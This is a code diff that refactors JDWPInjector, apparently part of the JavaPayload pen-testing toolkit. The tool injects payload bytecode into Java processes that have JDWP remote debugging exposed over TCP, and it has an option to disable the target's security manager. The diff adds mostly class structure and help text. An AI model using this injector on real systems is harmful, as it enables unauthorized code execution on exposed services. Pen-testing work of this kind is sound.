@@ -41,8 +41,10 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
 
+import javapayload.Parameter;
 import javapayload.handler.stager.PollingTunnel;
 import javapayload.handler.stager.StagerHandler;
+import javapayload.handler.stager.StagerHandler.Loader;
 import javapayload.loader.DynLoader;
 
 import com.sun.jdi.ClassType;
@@ -58,7 +60,7 @@ import com.sun.jdi.event.EventSet;
 import com.sun.jdi.event.StepEvent;
 import com.sun.jdi.request.StepRequest;
 
-public class JDWPInjector {
+public class JDWPInjector extends Injector {
 
 	public static ClassType inject(VirtualMachine vm, byte[][] classes, String embeddedArgs, boolean disableSecurityManager, PrintStream consoleOut) throws Exception {
 		ClassType result = null;
@@ -125,17 +127,38 @@ public class JDWPInjector {
 		return result;
 	}
 
+	/** @deprecated */
 	public static void main(String[] args) throws Exception {
 		if (args.length < 4) {
 			System.out.println("Usage: java javapayload.builder.JDWPInjector <port|hostname:port|port!|hostname:port!> <stager> [stageroptions] -- <stage> [stageoptions]");
 			return;
 		}
-		final String[] stagerArgs = new String[args.length - 1];
-		for (int i = 1; i < args.length; i++) {
-			stagerArgs[i - 1] = args[i];
-		}
-		StagerHandler.Loader loader = new StagerHandler.Loader(stagerArgs);
-		inject(args[0], loader, stagerArgs);
+		new JDWPInjector().inject(args);
+	}
+
+	public JDWPInjector() {
+		super("Inject a payload into a JDWP debug agent", 
+				"This injector is used to inject a payload into a java process that has\r\n" +
+				"remote debugging via JDWP over TCP enabled. In this case, an attacker can\r\n" +
+				"inject arbitrary bytecode, including loading new classes.\r\n" +
+				"\r\n" +
+				"If the target process has a security manager installed, loading the stage\r\n" +
+				"will most likely fail.\r\n" + 
+				"In that case you can add an exclamation mark to the connector specification\r\n" +
+				"(like \"2010!\") to deactivate the security manager in the target process.\r\n" +
+				"Note that in this case the security manager will remain disabled even after\r\n" +
+				"your payload terminates, so make sure to not open additional security holes\r\n" +
+				"in your pen-test when trying this!");
+	}
+	
+	public void inject(String[] parameters, Loader loader, String[] stagerArgs) throws Exception {
+		inject(parameters[0], loader, stagerArgs);
+	}
+	
+	public Parameter[] getParameters() {
+		return new Parameter[] {
+			new Parameter("CONNECTOR", false, Parameter.TYPE_ANY, "Method to connect to the JDWP agent, like [<hostname>:]<port>[!]")
+		};
 	}
 	
 	public static void inject(String connector, final StagerHandler.Loader loader, String[] stagerArgs) throws Exception {
